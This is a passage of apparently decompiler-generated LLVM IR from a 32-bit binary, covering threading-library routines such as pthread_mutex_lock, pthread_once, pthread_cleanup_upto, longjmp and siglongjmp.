  %v1_805acaa = icmp eq i1 %v15_805aca5, false
  br i1 %v1_805acaa, label %dec_label_pc_805acb3, label %dec_label_pc_805acac

dec_label_pc_805acac:                             ; preds = %dec_label_pc_805aca0
  %v1_805acac = add i32 %v0_805aca5, 4
  %v2_805acac = inttoptr i32 %v1_805acac to i32*
  %v3_805acac = load i32, i32* %v2_805acac, align 4
  %v4_805acac = add i32 %v3_805acac, 1
  store i32 %v4_805acac, i32* %v2_805acac, align 4
  br label %dec_label_pc_805acaf

dec_label_pc_805acaf:                             ; preds = %dec_label_pc_805aced, %dec_label_pc_805acb3, %dec_label_pc_805ac94, %dec_label_pc_805acac
  br label %dec_label_pc_805ad16

dec_label_pc_805acb3:                             ; preds = %dec_label_pc_805aca0
  %v1_805acb3 = add i32 %v0_805aca5, 16
  store i32 %v1_805acb3, i32* @eax, align 4
  store i32 %v1_805aca0, i32* @edx, align 4
  %v0_805acb8 = load i32, i32* %stack_var_-12, align 4
  %v1_805acb8 = call i32 @__pthread_lock(i32 %v0_805acb8)
  %v0_805acbd = load i32, i32* @ebx, align 4
  %v1_805acbd = load i32, i32* @esi, align 4
  %v2_805acbd = add i32 %v1_805acbd, 8
  %v3_805acbd = inttoptr i32 %v2_805acbd to i32*
  store i32 %v0_805acbd, i32* %v3_805acbd, align 4
  %v0_805acc0 = load i32, i32* @esi, align 4
  %v1_805acc0 = add i32 %v0_805acc0, 4
  %v2_805acc0 = inttoptr i32 %v1_805acc0 to i32*
  store i32 0, i32* %v2_805acc0, align 4
  br label %dec_label_pc_805acaf

dec_label_pc_805acc9:                             ; preds = %dec_label_pc_805ac88
  %v1_805acc9 = call i32 @thread_self.18(i32 %v0_805ac5f)
  %v0_805acd3 = load i32, i32* @esi, align 4
  %v1_805acd3 = add i32 %v0_805acd3, 8
  %v2_805acd3 = inttoptr i32 %v1_805acd3 to i32*
  %v3_805acd3 = load i32, i32* %v2_805acd3, align 4
  %v15_805acd3 = icmp eq i32 %v3_805acd3, %v1_805acc9
  store i32 %v1_805acc9, i32* @ebx, align 4
  br i1 %v15_805acd3, label %dec_label_pc_805ad16, label %dec_label_pc_805acda

dec_label_pc_805acda:                             ; preds = %dec_label_pc_805acc9
  %v0_805acdb = load i32, i32* @edi, align 4
  %v1_805acdd = add i32 %v0_805acd3, 16
  %v4_805ace1 = inttoptr i32 %v1_805acdd to i32*
  %v5_805ace1 = call i32 @__pthread_alt_timedlock(i32* %v4_805ace1, i32 %v1_805acc9, i32 %v0_805acdb, i32 %v1_805acc9)
  %v1_805ace9 = icmp eq i32 %v5_805ace1, 0
  br i1 %v1_805ace9, label %dec_label_pc_805ad11, label %dec_label_pc_805aced

dec_label_pc_805aced:                             ; preds = %dec_label_pc_805acda
  %v0_805aced = load i32, i32* @ebx, align 4
  %v1_805aced = load i32, i32* @esi, align 4
  %v2_805aced = add i32 %v1_805aced, 8
  %v3_805aced = inttoptr i32 %v2_805aced to i32*
  store i32 %v0_805aced, i32* %v3_805aced, align 4
  br label %dec_label_pc_805acaf

dec_label_pc_805acf2:                             ; preds = %dec_label_pc_805ac8d
  %v0_805acf2 = load i32, i32* @ecx, align 4
  %v1_805acf6 = add i32 %arg1, 16
  %v4_805acfa = inttoptr i32 %v1_805acf6 to i32*
  %v5_805acfa = call i32 @__pthread_alt_timedlock(i32* %v4_805acfa, i32 0, i32 %arg2, i32 %v0_805acf2)
  %v1_805ad04 = icmp eq i32 %v5_805acfa, 0
  %v1_805ad06 = icmp eq i1 %v1_805ad04, false
  br i1 %v1_805ad06, label %dec_label_pc_805ad16, label %dec_label_pc_805ad11

dec_label_pc_805ad0a:                             ; preds = %dec_label_pc_805ac7f, %dec_label_pc_805ac8d, %entry
  br label %dec_label_pc_805ad16

dec_label_pc_805ad11:                             ; preds = %dec_label_pc_805acf2, %dec_label_pc_805acda
  br label %dec_label_pc_805ad16

dec_label_pc_805ad16:                             ; preds = %dec_label_pc_805acf2, %dec_label_pc_805acc9, %dec_label_pc_805ad0a, %dec_label_pc_805acaf, %dec_label_pc_805ad11
  %v0_805ad17 = phi i32 [ 0, %dec_label_pc_805acf2 ], [ 35, %dec_label_pc_805acc9 ], [ 22, %dec_label_pc_805ad0a ], [ 0, %dec_label_pc_805acaf ], [ 110, %dec_label_pc_805ad11 ]
  ret i32 %v0_805ad17

; uselistorder directives
  uselistorder i32 %v1_805acc9, { 1, 2, 3, 0 }
  uselistorder i32 %v1_805aca0, { 1, 2, 0 }
  uselistorder i32 %v1_805ac78, { 1, 0 }
  uselistorder i32 %v3_805ac75, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805ac5f, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805ad16, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805ad0a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805acaf, { 0, 1, 3, 2 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805ad1c = load i32, i32* @esi, align 4
  %v0_805ad1d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805ad25 = add i32 %arg1, 12
  %v2_805ad25 = inttoptr i32 %v1_805ad25 to i32*
  %v3_805ad25 = load i32, i32* %v2_805ad25, align 4
  %v1_805ad28 = add i32 %v3_805ad25, -1
  %v5_805ad28 = icmp eq i32 %v3_805ad25, 0
  %v9_805ad28 = icmp eq i32 %v1_805ad28, 0
  br i1 %v9_805ad28, label %dec_label_pc_805ad52, label %dec_label_pc_805ad2d

dec_label_pc_805ad2d:                             ; preds = %entry
  %v10_805ad28 = icmp slt i32 %v1_805ad28, 0
  %v6_805ad28 = sub i32 0, %v3_805ad25
  %v7_805ad28 = and i32 %v3_805ad25, %v6_805ad28
  %v8_805ad28 = icmp slt i32 %v7_805ad28, 0
  %v3_805ad2d = icmp eq i1 %v10_805ad28, %v8_805ad28
  br i1 %v3_805ad2d, label %dec_label_pc_805ad35, label %dec_label_pc_805ad2f

dec_label_pc_805ad2f:                             ; preds = %dec_label_pc_805ad2d
  br i1 %v5_805ad28, label %dec_label_pc_805ad46, label %dec_label_pc_805ad3f

dec_label_pc_805ad35:                             ; preds = %dec_label_pc_805ad2d
  %v9_805ad35 = icmp eq i32 %v3_805ad25, 2
  br i1 %v9_805ad35, label %dec_label_pc_805ad7b, label %dec_label_pc_805ad3a

dec_label_pc_805ad3a:                             ; preds = %dec_label_pc_805ad35
  %v9_805ad3a = icmp eq i32 %v3_805ad25, 3
  br i1 %v9_805ad3a, label %dec_label_pc_805ad9d, label %dec_label_pc_805ad3f

dec_label_pc_805ad3f:                             ; preds = %dec_label_pc_805ad2f, %dec_label_pc_805ad3a
  br label %dec_label_pc_805adaf

dec_label_pc_805ad46:                             ; preds = %dec_label_pc_805ad2f
  %v1_805ad46 = add i32 %arg1, 16
  store i32 %v1_805ad46, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_805ad4b = call i32 @__pthread_lock(i32 %v0_805ad1d)
  br label %dec_label_pc_805ad61

dec_label_pc_805ad52:                             ; preds = %entry
  %v1_805ad52 = call i32 @thread_self.18(i32 %v0_805ad1d)
  %v0_805ad57 = load i32, i32* @esi, align 4
  %v1_805ad57 = add i32 %v0_805ad57, 8
  %v2_805ad57 = inttoptr i32 %v1_805ad57 to i32*
  %v3_805ad57 = load i32, i32* %v2_805ad57, align 4
  %v15_805ad57 = icmp eq i32 %v3_805ad57, %v1_805ad52
  store i32 %v1_805ad52, i32* @ebx, align 4
  %v1_805ad5c = icmp eq i1 %v15_805ad57, false
  br i1 %v1_805ad5c, label %dec_label_pc_805ad65, label %dec_label_pc_805ad5e

dec_label_pc_805ad5e:                             ; preds = %dec_label_pc_805ad52
  %v1_805ad5e = add i32 %v0_805ad57, 4
  %v2_805ad5e = inttoptr i32 %v1_805ad5e to i32*
  %v3_805ad5e = load i32, i32* %v2_805ad5e, align 4
  %v4_805ad5e = add i32 %v3_805ad5e, 1
  store i32 %v4_805ad5e, i32* %v2_805ad5e, align 4
  br label %dec_label_pc_805ad61

dec_label_pc_805ad61:                             ; preds = %dec_label_pc_805ad65, %dec_label_pc_805ad46, %dec_label_pc_805ad5e
  br label %dec_label_pc_805adaf

dec_label_pc_805ad65:                             ; preds = %dec_label_pc_805ad52
  %v1_805ad65 = add i32 %v0_805ad57, 16
  store i32 %v1_805ad65, i32* @eax, align 4
  store i32 %v1_805ad52, i32* @edx, align 4
  %v1_805ad6a = call i32 @__pthread_lock(i32 %v0_805ad1d)
  %v0_805ad6f = load i32, i32* @ebx, align 4
  %v1_805ad6f = load i32, i32* @esi, align 4
  %v2_805ad6f = add i32 %v1_805ad6f, 8
  %v3_805ad6f = inttoptr i32 %v2_805ad6f to i32*
  store i32 %v0_805ad6f, i32* %v3_805ad6f, align 4
  %v0_805ad72 = load i32, i32* @esi, align 4
  %v1_805ad72 = add i32 %v0_805ad72, 4
  %v2_805ad72 = inttoptr i32 %v1_805ad72 to i32*
  store i32 0, i32* %v2_805ad72, align 4
  br label %dec_label_pc_805ad61

dec_label_pc_805ad7b:                             ; preds = %dec_label_pc_805ad35
  %v1_805ad7b = call i32 @thread_self.18(i32 %v0_805ad1d)
  store i32 %v1_805ad7b, i32* @ebx, align 4
  %v0_805ad87 = load i32, i32* @esi, align 4
  %v1_805ad87 = add i32 %v0_805ad87, 8
  %v2_805ad87 = inttoptr i32 %v1_805ad87 to i32*
  %v3_805ad87 = load i32, i32* %v2_805ad87, align 4
  %v15_805ad87 = icmp eq i32 %v3_805ad87, %v1_805ad7b
  br i1 %v15_805ad87, label %dec_label_pc_805adaf, label %dec_label_pc_805ad8c

dec_label_pc_805ad8c:                             ; preds = %dec_label_pc_805ad7b
  %v1_805ad8f = add i32 %v0_805ad87, 16
  %v3_805ad93 = inttoptr i32 %v1_805ad8f to i32*
  %v4_805ad93 = call i32 @__pthread_alt_lock(i32* %v3_805ad93, i32 %v1_805ad7b, i32 35)
  %v0_805ad98 = load i32, i32* @ebx, align 4
  %v1_805ad98 = load i32, i32* @esi, align 4
  %v2_805ad98 = add i32 %v1_805ad98, 8
  %v3_805ad98 = inttoptr i32 %v2_805ad98 to i32*
  store i32 %v0_805ad98, i32* %v3_805ad98, align 4
  br label %dec_label_pc_805adaa

dec_label_pc_805ad9d:                             ; preds = %dec_label_pc_805ad3a
  %v0_805ad9d = load i32, i32* @ecx, align 4
  %v1_805ada1 = add i32 %arg1, 16
  %v3_805ada5 = inttoptr i32 %v1_805ada1 to i32*
  %v4_805ada5 = call i32 @__pthread_alt_lock(i32* %v3_805ada5, i32 0, i32 %v0_805ad9d)
  br label %dec_label_pc_805adaa

dec_label_pc_805adaa:                             ; preds = %dec_label_pc_805ad8c, %dec_label_pc_805ad9d
  br label %dec_label_pc_805adaf

dec_label_pc_805adaf:                             ; preds = %dec_label_pc_805ad7b, %dec_label_pc_805ad61, %dec_label_pc_805ad3f, %dec_label_pc_805adaa
  %v0_805adb2 = phi i32 [ 35, %dec_label_pc_805ad7b ], [ 0, %dec_label_pc_805ad61 ], [ 22, %dec_label_pc_805ad3f ], [ 0, %dec_label_pc_805adaa ]
  %v2_805adaf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805adaf, i32* @edx, align 4
  store i32 %v0_805ad1d, i32* @ebx, align 4
  store i32 %v0_805ad1c, i32* @esi, align 4
  ret i32 %v0_805adb2

; uselistorder directives
  uselistorder i32 %v1_805ad7b, { 1, 0, 2 }
  uselistorder i32 %v1_805ad52, { 1, 2, 0 }
  uselistorder i32 %v1_805ad28, { 1, 0 }
  uselistorder i32 %v3_805ad25, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_805ad1d, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_alt_lock, { 1, 2, 0 }
  uselistorder i32 (i32)* @thread_self.18, { 2, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805adaf, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805adaa, { 1, 0 }
  uselistorder label %dec_label_pc_805ad61, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805ad3f, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare() local_unnamed_addr {
entry:
  %v1_805adbb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  ret i32 %v1_805adbb
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_805adc4 = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v2_805adcd = load i32, i32* %arg1, align 4
  %v11_805adcd = icmp eq i32 %v2_805adcd, 2
  %v1_805add0 = icmp eq i1 %v11_805adcd, false
  br i1 %v1_805add0, label %dec_label_pc_805add7, label %dec_label_pc_805ae9e

dec_label_pc_805add7:                             ; preds = %entry
  %v1_805addf = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  %v0_805ade4 = load i32, i32* @esi, align 4
  %v1_805ade4 = inttoptr i32 %v0_805ade4 to i32*
  %v2_805ade4 = load i32, i32* %v1_805ade4, align 4
  %v1_805adeb = urem i32 %v2_805ade4, 4
  %v8_805adee = icmp eq i32 %v1_805adeb, 1
  %v1_805adef = icmp eq i1 %v8_805adee, false
  br i1 %v1_805adef, label %dec_label_pc_805ae18.preheader, label %dec_label_pc_805adf1

dec_label_pc_805adf1:                             ; preds = %dec_label_pc_805add7
  %v1_805adf1 = and i32 %v2_805ade4, -4
  %v1_805adf4 = load i32, i32* @global_var_8079c8c.627, align 4
  %v12_805adf4 = icmp eq i32 %v1_805adf1, %v1_805adf4
  br i1 %v12_805adf4, label %dec_label_pc_805ae18.preheader, label %dec_label_pc_805adfc

dec_label_pc_805adfc:                             ; preds = %dec_label_pc_805adf1
  store i32 0, i32* %v1_805ade4, align 4
  %v0_805ae1813.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805ae18.preheader

dec_label_pc_805ae18.preheader:                   ; preds = %dec_label_pc_805adfc, %dec_label_pc_805add7, %dec_label_pc_805adf1
  %v0_805ae1813 = phi i32 [ %v0_805ae1813.pre, %dec_label_pc_805adfc ], [ %v0_805ade4, %dec_label_pc_805add7 ], [ %v0_805ade4, %dec_label_pc_805adf1 ]
  %v1_805ae1814 = inttoptr i32 %v0_805ae1813 to i32*
  %v2_805ae1815 = load i32, i32* %v1_805ae1814, align 4
  %v1_805ae1c16 = urem i32 %v2_805ae1815, 4
  %v8_805ae1f19 = icmp eq i32 %v1_805ae1c16, 1
  br i1 %v8_805ae1f19, label %dec_label_pc_805ae04, label %dec_label_pc_805ae22

dec_label_pc_805ae04:                             ; preds = %dec_label_pc_805ae18.preheader, %dec_label_pc_805ae04
  %v0_805ae04 = load i32, i32* @ecx, align 4
  %v4_805ae10 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_8079c80.626 to i32), i32 ptrtoint (i32* @global_var_8079c68.625 to i32), i32 %v0_805ae04, i32 %v0_805ae04)
  %v0_805ae18 = load i32, i32* @esi, align 4
  %v1_805ae18 = inttoptr i32 %v0_805ae18 to i32*
  %v2_805ae18 = load i32, i32* %v1_805ae18, align 4
  %v1_805ae1c = urem i32 %v2_805ae18, 4
  %v8_805ae1f = icmp eq i32 %v1_805ae1c, 1
  br i1 %v8_805ae1f, label %dec_label_pc_805ae04, label %dec_label_pc_805ae22

dec_label_pc_805ae22:                             ; preds = %dec_label_pc_805ae04, %dec_label_pc_805ae18.preheader
  %v1_805ae18.lcssa = phi i32* [ %v1_805ae1814, %dec_label_pc_805ae18.preheader ], [ %v1_805ae18, %dec_label_pc_805ae04 ]
  %v2_805ae18.lcssa = phi i32 [ %v2_805ae1815, %dec_label_pc_805ae18.preheader ], [ %v2_805ae18, %dec_label_pc_805ae04 ]
  store i32 0, i32* @ebx, align 4
  %v1_805ae24 = icmp eq i32 %v2_805ae18.lcssa, 0
  %v1_805ae26 = icmp eq i1 %v1_805ae24, false
  br i1 %v1_805ae26, label %dec_label_pc_805ae7a, label %dec_label_pc_805ae28

dec_label_pc_805ae28:                             ; preds = %dec_label_pc_805ae22
  %v0_805ae28 = load i32, i32* @global_var_8079c8c.627, align 4
  %v1_805ae30 = or i32 %v0_805ae28, 1
  store i32 %v1_805ae30, i32* %v1_805ae18.lcssa, align 4
  %v1_805ae3a = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  %v0_805ae42 = load i32, i32* @esi, align 4
  %v2_805ae48 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805ae48, i32* @ebx, align 4
  %v4_805ae4d = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-24, i32 134590118, i32 %v0_805ae42)
  call void @__pseudo_call(i32 %tmp2)
  %v3_805ae5b = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-24, i32 0)
  %v1_805ae67 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  store i32 1, i32* @ebx, align 4
  %v0_805ae74 = load i32, i32* @esi, align 4
  %v1_805ae74 = inttoptr i32 %v0_805ae74 to i32*
  store i32 2, i32* %v1_805ae74, align 4
  br label %dec_label_pc_805ae7a

dec_label_pc_805ae7a:                             ; preds = %dec_label_pc_805ae22, %dec_label_pc_805ae28
  %v1_805ae82 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  %v0_805ae8a = load i32, i32* @ebx, align 4
  %v1_805ae8a = icmp eq i32 %v0_805ae8a, 0
  br i1 %v1_805ae8a, label %dec_label_pc_805ae9e, label %dec_label_pc_805ae8e

dec_label_pc_805ae8e:                             ; preds = %dec_label_pc_805ae7a
  %v1_805ae96 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_8079c80.626 to i32))
  br label %dec_label_pc_805ae9e

dec_label_pc_805ae9e:                             ; preds = %entry, %dec_label_pc_805ae7a, %dec_label_pc_805ae8e
  store i32 %v0_805adc4, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805ae18, { 1, 0 }
  uselistorder i32 %v2_805ae1815, { 1, 0 }
  uselistorder i32 %v2_805ade4, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder i32* @global_var_8079c8c.627, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805ae9e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ae7a, { 1, 0 }
  uselistorder label %dec_label_pc_805ae04, { 1, 0 }
  uselistorder label %dec_label_pc_805ae18.preheader, { 0, 2, 1 }
}

define i32 @pthread_once_cancelhandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805aea6 = load i32, i32* @ebx, align 4
  store i32 %v0_805aea6, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805aeb3 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  %v0_805aeb8 = load i32, i32* @ebx, align 4
  %v1_805aeb8 = inttoptr i32 %v0_805aeb8 to i32*
  store i32 0, i32* %v1_805aeb8, align 4
  %v1_805aec5 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8079c68.625 to i32))
  %v2_805aed5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aed5, i32* @ebx, align 4
  %v1_805aed6 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_8079c80.626 to i32))
  ret i32 %v1_805aed6

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_8079c80.626, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8079c80.626 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8079c68.625 to i32), { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9 }
}

define i32 @pthread_cleanup_upto(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-480 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805aede = load i32, i32* @eax, align 4
  store i32 %v0_805aede, i32* %edi.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074f40 to i32), i32* %esi.global-to-local, align 4
  %v0_805aee6 = load i32, i32* @ebx, align 4
  store i32 %v0_805aee6, i32* %stack_var_-16, align 4
  %v4_805aee6 = ptrtoint i32* %stack_var_-16 to i32
  %v1_805aeee = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_805aeee = icmp ult i32 %v4_805aee6, %v1_805aeee
  %v1_805aef4 = icmp eq i1 %v7_805aeee, false
  br i1 %v1_805aef4, label %dec_label_pc_805af2c, label %dec_label_pc_805aef6

dec_label_pc_805aef6:                             ; preds = %entry
  %v1_805aef6 = load i32, i32* @global_var_8079c50.566, align 16
  %v7_805aef6 = icmp ult i32 %v4_805aee6, %v1_805aef6
  br i1 %v7_805aef6, label %dec_label_pc_805af0b, label %dec_label_pc_805aefe

dec_label_pc_805aefe:                             ; preds = %dec_label_pc_805aef6
  %v1_805aefe = load i32, i32* @global_var_8079c54.567, align 4
  %v7_805aefe = icmp ult i32 %v4_805aee6, %v1_805aefe
  store i32 ptrtoint (i32* @global_var_8075120.568 to i32), i32* %esi.global-to-local, align 4
  br i1 %v7_805aefe, label %dec_label_pc_805af2c, label %dec_label_pc_805af0b

dec_label_pc_805af0b:                             ; preds = %dec_label_pc_805aefe, %dec_label_pc_805aef6
  %v0_805af0b = load i32, i32* @global_var_807f358.569, align 8
  %v1_805af0b = icmp eq i32 %v0_805af0b, 0
  br i1 %v1_805af0b, label %dec_label_pc_805af21, label %dec_label_pc_805af14

dec_label_pc_805af14:                             ; preds = %dec_label_pc_805af0b
  %v0_805af14 = call i32 @__pthread_find_self()
  store i32 %v0_805af14, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805af2c

dec_label_pc_805af1d:                             ; preds = %dec_label_pc_805af35
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805af50

dec_label_pc_805af21:                             ; preds = %dec_label_pc_805af0b
  %v2_805af26 = ptrtoint i32* %stack_var_-480 to i32
  store i32 %v2_805af26, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805af2c

dec_label_pc_805af2c:                             ; preds = %dec_label_pc_805aefe, %entry, %dec_label_pc_805af14, %dec_label_pc_805af21
  %v0_805af2c = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_805aefe ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v0_805af14, %dec_label_pc_805af14 ], [ %v2_805af26, %dec_label_pc_805af21 ]
  %v1_805af2c = add i32 %v0_805af2c, 60
  %v2_805af2c = inttoptr i32 %v1_805af2c to i32*
  %v3_805af2c = load i32, i32* %v2_805af2c, align 4
  store i32 %v3_805af2c, i32* %ebx.global-to-local, align 4
  store i32 %v4_805aee6, i32* %ebp.global-to-local, align 4
  %v1_805af472 = icmp eq i32 %v3_805af2c, 0
  br i1 %v1_805af472, label %dec_label_pc_805af50, label %dec_label_pc_805af4b.lr.ph

dec_label_pc_805af4b.lr.ph:                       ; preds = %dec_label_pc_805af2c
  br label %dec_label_pc_805af4b

dec_label_pc_805af35:                             ; preds = %dec_label_pc_805af4b
  %v1_805af35 = load i32, i32* %ebp.global-to-local, align 4
  %tmp = icmp ugt i32 %v4_805af3f, %v1_805af35
  br i1 %tmp, label %dec_label_pc_805af39, label %dec_label_pc_805af1d

dec_label_pc_805af39:                             ; preds = %dec_label_pc_805af35
  %v5_805af3f = inttoptr i32 %v4_805af3f to i32*
  %v6_805af3f = load i32, i32* %v5_805af3f, align 4
  call void @__pseudo_call(i32 %v6_805af3f)
  %v0_805af41 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805af41 = add i32 %v0_805af41, 12
  %v2_805af41 = inttoptr i32 %v1_805af41 to i32*
  %v3_805af41 = load i32, i32* %v2_805af41, align 4
  store i32 %v3_805af41, i32* %ebx.global-to-local, align 4
  %v1_805af47 = icmp eq i32 %v3_805af41, 0
  br i1 %v1_805af47, label %dec_label_pc_805af50, label %dec_label_pc_805af4b

dec_label_pc_805af4b:                             ; preds = %dec_label_pc_805af4b.lr.ph, %dec_label_pc_805af39
  %v4_805af3f = phi i32 [ %v3_805af2c, %dec_label_pc_805af4b.lr.ph ], [ %v3_805af41, %dec_label_pc_805af39 ]
  %v1_805af4b = load i32, i32* %edi.global-to-local, align 4
  %v2_805af4b = add i32 %v1_805af4b, 16
  %v3_805af4b = inttoptr i32 %v2_805af4b to i32*
  %v4_805af4b = load i32, i32* %v3_805af4b, align 4
  %v10_805af4b = icmp ult i32 %v4_805af3f, %v4_805af4b
  br i1 %v10_805af4b, label %dec_label_pc_805af35, label %dec_label_pc_805af50

dec_label_pc_805af50:                             ; preds = %dec_label_pc_805af39, %dec_label_pc_805af4b, %dec_label_pc_805af2c, %dec_label_pc_805af1d
  %v0_805af53 = phi i32 [ 0, %dec_label_pc_805af1d ], [ 0, %dec_label_pc_805af2c ], [ %v4_805af3f, %dec_label_pc_805af4b ], [ 0, %dec_label_pc_805af39 ]
  %v0_805af50 = load i32, i32* %esi.global-to-local, align 4
  %v1_805af50 = add i32 %v0_805af50, 84
  %v2_805af50 = inttoptr i32 %v1_805af50 to i32*
  %v3_805af50 = load i32, i32* %v2_805af50, align 4
  %v2_805af53 = add i32 %v0_805af50, 60
  %v3_805af53 = inttoptr i32 %v2_805af53 to i32*
  store i32 %v0_805af53, i32* %v3_805af53, align 4
  %v1_805af56 = icmp eq i32 %v3_805af50, 0
  br i1 %v1_805af56, label %dec_label_pc_805af66, label %dec_label_pc_805af5a

dec_label_pc_805af5a:                             ; preds = %dec_label_pc_805af50
  %v1_805af5a = load i32, i32* %edi.global-to-local, align 4
  %v2_805af5a = add i32 %v1_805af5a, 16
  %v3_805af5a = inttoptr i32 %v2_805af5a to i32*
  %v4_805af5a = load i32, i32* %v3_805af5a, align 4
  %v10_805af5a = icmp ult i32 %v3_805af50, %v4_805af5a
  %v1_805af5d = icmp eq i1 %v10_805af5a, false
  br i1 %v1_805af5d, label %dec_label_pc_805af66, label %dec_label_pc_805af5f

dec_label_pc_805af5f:                             ; preds = %dec_label_pc_805af5a
  %v0_805af5f = load i32, i32* %esi.global-to-local, align 4
  %v1_805af5f = add i32 %v0_805af5f, 84
  %v2_805af5f = inttoptr i32 %v1_805af5f to i32*
  store i32 0, i32* %v2_805af5f, align 4
  br label %dec_label_pc_805af66

dec_label_pc_805af66:                             ; preds = %dec_label_pc_805af5a, %dec_label_pc_805af50, %dec_label_pc_805af5f
  %v2_805af69 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805af69, i32* @ebx, align 4
  ret i32 %v3_805af50

; uselistorder directives
  uselistorder i32 %v3_805af50, { 1, 0, 2 }
  uselistorder i32 %v4_805af3f, { 1, 3, 0, 2 }
  uselistorder i32 %v3_805af41, { 1, 0, 2 }
  uselistorder i32 %v4_805aee6, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805af66, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805af50, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805af4b, { 1, 0 }
  uselistorder label %dec_label_pc_805af2c, { 3, 2, 0, 1 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805af6e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805af78 = call i32 @pthread_cleanup_upto(i32 %v0_805af6e)
  %v0_805af83 = load i32, i32* @ebx, align 4
  %v4_805af84 = call i32 @_longjmp(i32 %v0_805af83, i32 %arg2, i32 %v1_805af78, i32 %v1_805af78)
  ret i32 %v4_805af84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805af89 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805af93 = call i32 @pthread_cleanup_upto(i32 %v0_805af89)
  %v0_805af98 = load i32, i32* @edx, align 4
  %v0_805af9e = load i32, i32* @ebx, align 4
  %v4_805af9f = call i32 @_longjmp(i32 %v0_805af9e, i32 %arg2, i32 %v0_805af98, i32 %v0_805af98)
  ret i32 %v4_805af9f

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 (i32)* @pthread_cleanup_upto, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @thread_self.19(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_805afa4 = load i32, i32* @esp, align 4
  %v1_805afa4 = load i32, i32* @global_var_8079c4c.565, align 4
